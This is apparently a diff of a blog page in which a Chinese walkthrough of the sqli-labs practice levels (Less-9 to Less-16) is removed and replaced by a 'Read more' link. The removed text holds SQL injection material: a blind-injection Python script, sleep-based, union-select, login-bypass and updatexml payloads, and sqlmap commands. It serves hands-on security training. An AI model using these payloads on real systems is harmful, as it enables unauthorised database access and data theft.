class="number">128</span></span><br><span class="line">    mid = (<span class="built_in">min</span> + <span class="built_in">max</span>) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">min</span> &lt; <span class="built_in">max</span>):</span><br><span class="line">        payload = host + <span class="string">&quot;?id=1&#x27; and (ascii(substr(&quot;</span> + <span class="string">&#x27;(&#x27;</span> + sql + <span class="string">&#x27;)&#x27;</span> + <span class="string">&quot;,&#123;&#125;,1))&gt;&#123;&#125;)--+&quot;</span>.<span class="built_in">format</span>(i, mid)</span><br><span class="line">        res = requests.get(url=payload)</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        time.sleep(<span class="number">0.05</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">min</span> = mid + <span class="number">1</span></span><br><span class="line">        mid = (<span class="built_in">min</span> + <span class="built_in">max</span>) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid &lt;= <span class="number">32</span> <span class="keyword">or</span> mid &gt;= <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag = flag + <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
-
-<h3 id="less9"><a href="#less9" class="headerlink" title="less9:"></a>less9:</h3><p><code>?id=1&#39; and sleep(5)--+</code><br>延时注入，测得注入点为’，因为这一关输入什么页面只有一种回显，使用延时注入<br>不废话sqlmap一把梭<br>sqlmap -u <a target="_blank" rel="noopener" href="http://locat.test/Less-9/?id=1">http://locat.test/Less-9/?id=1</a> –dbs</p>
-<h3 id="less10"><a href="#less10" class="headerlink" title="less10:"></a>less10:</h3><p>&#x2F;?id&#x3D;1” and sleep(5)–+ ,使用双引号闭合，同less9</p>
-<h3 id="less11"><a href="#less11" class="headerlink" title="less11:"></a>less11:</h3><p><img src="/blog/images/Pasted_image_20251107215106.png"><br>post型注入，先使用万能密码试试：1’ or 1&#x3D;1 成功登录<br>抓包查看表单数据：uname&#x3D;1&amp;passwd&#x3D;1&amp;submit&#x3D;Submit<br>post:   submit&#x3D;Submit&amp;uname&#x3D;-1&amp;passwd&#x3D;-1’ union select 1,2#</p>
-<p><img src="/blog/images/Pasted_image_20251107215106.png"></p>
-<p>就可以进行查询了:<br>submit&#x3D;Submit&amp;uname&#x3D;-1&amp;passwd&#x3D;-1’ union select database(),version()#<br>或者使用sqlmap：<br>sqlmap -u <a target="_blank" rel="noopener" href="http://192.168.1.16/Less-11">http://192.168.1.16/Less-11</a><br>–data&#x3D;”submit&#x3D;Submit&amp;uname&#x3D;1&amp;passwd&#x3D;1” –dbs</p>
-<h3 id="less12"><a href="#less12" class="headerlink" title="less12:"></a>less12:</h3><p>根据报错判断使用”),其他与less11一致</p>
-<h3 id="less13"><a href="#less13" class="headerlink" title="less13:"></a>less13:</h3><p>根据报错判断使用’)闭合，但是正确时没有回显，使用报错注入<br><code>Submit=submit&amp;passwd=-1&amp;uname=-1&#39;) and updatexml(1,concat(0x7e,database(),0x7e),1)#</code></p>
-<h3 id="less14"><a href="#less14" class="headerlink" title="less14:"></a>less14:</h3><p>使用”闭合，其余与less13相同</p>
-<h3 id="less15"><a href="#less15" class="headerlink" title="less15:"></a>less15:</h3><p>没有报错信息，但是可以根据图片回显判断<br>提交1’ or 1&#x3D;1#<br><img src="/blog/images/Pasted_image_20251107230615.png"><br>提交错误：<br><img src="/blog/images/Pasted_image_20251107230711.png"><br>直接sqlmap吧</p>
-<h3 id="less16"><a href="#less16" class="headerlink" title="less16:"></a>less16:</h3><p>跟less15差不多，使用”)闭合</p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/blog/2025/11/26/sqli-labs/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
